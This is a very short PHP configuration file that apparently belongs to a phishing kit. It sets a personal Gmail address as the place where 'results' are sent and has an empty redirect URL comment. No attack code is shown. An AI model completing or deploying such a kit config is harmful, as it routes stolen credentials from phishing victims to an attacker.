<?php
//Spcify Redirect URL

//Specify Email that get results.
$send = "patrickfoong28@gmail.com";

?>